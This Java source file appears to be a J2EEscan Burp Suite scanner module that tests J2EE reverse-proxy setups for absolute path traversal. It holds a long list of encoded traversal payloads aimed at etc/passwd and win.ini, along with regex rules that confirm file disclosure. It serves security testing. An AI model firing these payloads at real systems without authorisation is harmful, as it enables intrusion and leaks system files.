package burp.j2ee.issues.impl;

import burp.j2ee.CustomScanIssue;
import burp.CustomHttpRequestResponse;
import static burp.HTTPMatcher.getApplicationContext;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IResponseInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;

import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Usually J2EE infrastructure relies on a front-end web server that acts as a
 * reverse proxy to one or more Application Servers.
 *
 * The communications between the HTTPD servers and the Application servers
 * could be made using different technologies and components.
 *
 * This module tries to detect vulnerabilities on this infrastructure using
 * different LFI attempts (using also utf-8 encoding attempts) on the web root
 * and on the context root of the application.
 *
 * Sometimes vulnerabilities or behaviors in one or more components in this
 * chain could be abused to retrieve and include remote application server's
 * resources
 *
 */
public class InfrastructurePathTraversal implements IModule {

    // List of host and port system already tested
    private static LinkedHashSet hs = new LinkedHashSet();
    // List of host  port and context already tested
    private static LinkedHashSet hsc = new LinkedHashSet();

    private static final String TITLE = "Absolute Path Traversal Vulnerability";
    private static final String DESCRIPTION = "J2EEscan identified a Path Traversal vulnerability; "
            + "it's possible to access files and directories that are stored outside "
            + "the web root folder. Usually J2EE infrastructure relies on a front-end "
            + "web server that acts as a reverse proxy to one or more Application Servers."
            + " The communications between the HTTPD servers and the Application servers "
            + "could be made using different technologies and components. Sometimes "
            + "vulnerabilities or behaviors in one or more components in this chain could be "
            + "abused to retrieve and include remote application server's resources"
            + "<br /><br />"
            + "<b>References</b>:<br /><br />"
            + "http://www.kb.cert.org/vuls/id/526012<br />"
            + "http://en.wikipedia.org/wiki/Directory_traversal_attack<br />"
            + "https://www.owasp.org/index.php/Testing_Directory_traversal/file_include_(OTG-AUTHZ-001)<br />"
            + "http://www.exploit-db.com/exploits/6229/<br />";

    private static final String REMEDY = "Update the remote vulnerable component";
    
    private PrintWriter stderr;
    private PrintWriter stdout;

    private static final List<String> UTF8_LFI_PATHS = Arrays.asList(
            "/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f",
            "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/",
            "/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f",
            "/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f",
            "/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f",
            "/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/",
            "/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f",
            "/..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c",
            "/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c",
            "/%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\",
            "/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af",
            "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/",
            "/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af",
            "/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af",
            "/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c",
            "/%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\",
            "/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c",
            "/%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\",
            "/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f",
            "/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f",
            "/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f",
            "/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/",
            "/..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\",
            "/..../..../..../..../..../..../..../..../..../..../..../..../..../..../..../..../..../..../",
            "%c2.%c2./%c2.%c2./%c2.%c2./%c2.%c2./%c2.%c2./%c2.%c2/%c2.%c2./%c2.%c2./%c2.%c2./%c2.%c2./%c2.%c2./%c2.%c2",
            "/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c"
    );

    private static final Map<String, Pattern> LFI_RESOURCES = new HashMap<String, Pattern>() {
        {
            put("etc/passwd", Pattern.compile("root:.*:0:[01]:", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE));
            put("windows\\win.ini", Pattern.compile("for 16\\-bit app support", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE));
        }
    };

    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        List<IScanIssue> issues = new ArrayList<>();

        IExtensionHelpers helpers = callbacks.getHelpers();
        stderr = new PrintWriter(callbacks.getStderr(), true);
        stdout = new PrintWriter(callbacks.getStdout(), true);

        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);

        URL url = reqInfo.getUrl();
        String host = url.getHost();
        int port = url.getPort();
        String protocol = url.getProtocol();
        Boolean isSSL = (protocol.equals("https"));

        String system = host.concat(Integer.toString(port));

        /**
         * Local file include attempt on the web root
         *
         * http://www.example.com/{FUZZ_LFI_PAYLOADS}
         */
        // System not yet tested for this vulnerability
        if (!hs.contains(system)) {

            hs.add(system);

            // Test Local File include
            for (String path : UTF8_LFI_PATHS) {

                Set<String> lfiOSResources = LFI_RESOURCES.keySet();

                for (String osResource : lfiOSResources) {

                    try {

                        URL urlToTest = new URL(protocol, url.getHost(), url.getPort(), path + osResource);
                        byte[] utf8LFIAttempt = helpers.buildHttpRequest(urlToTest);

                        byte[] responseBytes = callbacks.makeHttpRequest(url.getHost(),
                                url.getPort(), isSSL, utf8LFIAttempt);

                        IResponseInfo UTF8LFIInfo = helpers.analyzeResponse(responseBytes);
                        String response = helpers.bytesToString(responseBytes);

                        Pattern detectionRule = LFI_RESOURCES.get(osResource);

                        Matcher matcher = detectionRule.matcher(response);
                        if (matcher.find()) {
                            issues.add(new CustomScanIssue(
                                    baseRequestResponse.getHttpService(),
                                    urlToTest,
                                    new CustomHttpRequestResponse(utf8LFIAttempt, responseBytes, baseRequestResponse.getHttpService()),
                                    TITLE,
                                    DESCRIPTION,
                                    REMEDY,
                                    Risk.Low,
                                    Confidence.Certain
                            ));
                            return issues;
                        }

                    } catch (MalformedURLException ex) {
                        stderr.println(ex);
                    } catch (Exception ex) {
                        stderr.println(ex);
                    }
                }
            }
        }

        /**
         * Local file include on the application context
         *
         * Ex: http://www.example.com/myapp/Login
         *
         * Retrieve the myapp context and test the LFI payloads on it
         *
         * Ex: http://www.example.com/myapp/{FUZZ_LFI_PAYLOADS}
         */
        String context = getApplicationContext(url);

        if (context.isEmpty()) {
            return issues;
        }

        String contextURI = system + context;

        if (!hsc.contains(contextURI)) {

            hsc.add(contextURI);

            // Test Local File include
            for (String path : UTF8_LFI_PATHS) {

                Set<String> lfiOSResources = LFI_RESOURCES.keySet();

                for (String osResource : lfiOSResources) {

                    try {

                        URL urlToTest = new URL(protocol, url.getHost(), url.getPort(), context + path + osResource);
                        byte[] utf8LFIAttempt = helpers.buildHttpRequest(urlToTest);

                        byte[] responseBytes = callbacks.makeHttpRequest(url.getHost(),
                                url.getPort(), isSSL, utf8LFIAttempt);

                        IResponseInfo UTF8LFIInfo = helpers.analyzeResponse(responseBytes);
                        String response = helpers.bytesToString(responseBytes);

                        Pattern detectionRule = LFI_RESOURCES.get(osResource);

                        Matcher matcher = detectionRule.matcher(response);
                        if (matcher.find()) {
                            issues.add(new CustomScanIssue(
                                    baseRequestResponse.getHttpService(),
                                    urlToTest,
                                    new CustomHttpRequestResponse(utf8LFIAttempt, responseBytes, baseRequestResponse.getHttpService()),
                                    TITLE,
                                    DESCRIPTION,
                                    REMEDY,
                                    Risk.Low,
                                    Confidence.Certain));
                            return issues;
                        }

                    } catch (MalformedURLException ex) {
                        stderr.println(ex);
                    } catch (Exception ex) {
                        stderr.println(ex);
                    }
                }

            }
        }

        return issues;
    }

}
